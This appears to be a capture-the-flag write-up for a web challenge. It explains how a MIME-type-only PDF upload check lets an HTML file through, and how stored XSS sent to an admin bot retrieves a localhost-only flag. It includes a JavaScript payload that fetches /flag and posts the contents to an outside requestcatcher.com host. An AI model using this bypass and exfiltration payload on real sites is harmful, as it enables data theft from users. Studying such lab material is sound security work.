Source code available. An admin bot is also provided. The location of the flag was found to be as follows: Obtaining the flag is possible by making a GET request to /flag via the admin bot.

```python
app.get('/flag', (req, res) => {
  let ip = req.connection.remoteAddress;
  if (ip === '127.0.0.1') {
    res.json({ flag: 'AKASEC{FAKE_FLAG}' });
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});

```

Upon searching for XSS, it was found that the upload feature could be exploited, leading to XSS. During uploads, only PDF files are accepted with the following validation:

```javascript
const upload = multer({ 
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype == "application/pdf") {
      cb(null, true);
    } else {
      cb(null, false);
      return cb(new Error('Only .pdf format allowed!'));
    }
  }
});

```

However, this part only checks the Request's Content-Type, so any file can pass the validation if this mimetype is specified. Therefore, after logging in, one should upload an HTML file as follows:

So execute solve.py with this line : "fetch('/flag').then(e=>e.text()).then(e=>{fetch('https://[yours].requestcatcher.com/post', { method : 'post', body: e })})"

This will redirect to something like /view/file-1717850909954.html, but it won't trigger from the view, so it must be opened directly at /uploads/file-1717850909954.html to trigger the XSS. Sending this to the admin bot will secure the flag. The intended solution involves performing XSS through CVE-2024-4367.